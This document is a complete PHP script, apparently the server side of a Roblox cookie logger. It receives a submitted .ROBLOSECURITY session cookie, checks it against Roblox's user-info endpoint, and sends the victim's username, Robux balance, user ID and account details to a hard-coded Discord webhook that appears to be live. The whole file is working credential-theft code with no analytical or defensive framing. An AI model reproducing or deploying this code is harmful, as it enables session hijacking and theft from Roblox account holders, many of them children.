<?php
// Your Discord Webhook URL
$webhook = 'https://discord.com/api/webhooks/1347344054828142592/wfkp6IKNPjsMph_80khvIt3AtJ6rUbNhAkr4TXXcuo9y77yIoG7PblOzg0IZTL5nux_W';

// Get cookie from POST
if (!isset($_POST['cookie'])) {
    die('No cookie provided.');
}

$cookie = $_POST['cookie'];

// Fetch Roblox user data
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.roblox.com/mobileapi/userinfo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=$cookie",
    "User-Agent: Roblox/WinInet"
));
$response = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpcode !== 200) {
    die('Invalid Cookie');
}

$data = json_decode($response, true);

// Prepare Discord Embed
$payload = json_encode([
    "embeds" => [[
        "title" => "New Cookie Submission",
        "color" => 65280,
        "fields" => [
            ["name" => "Username", "value" => $data['UserName'], "inline" => true],
            ["name" => "Robux", "value" => (string)$data['RobuxBalance'], "inline" => true],
            ["name" => "User ID", "value" => (string)$data['UserID'], "inline" => true],
            ["name" => "Summary", "value" => $data['Description'] ?: 'No summary.', "inline" => false],
            ["name" => "Account Created", "value" => $data['Created'] ?? 'Unknown', "inline" => false]
        ],
        "thumbnail" => ["url" => $data['ThumbnailUrl']]
    ]]
]);

// Send to Discord
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $webhook);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_exec($ch);
curl_close($ch);

echo "Submitted Successfully.";
?>

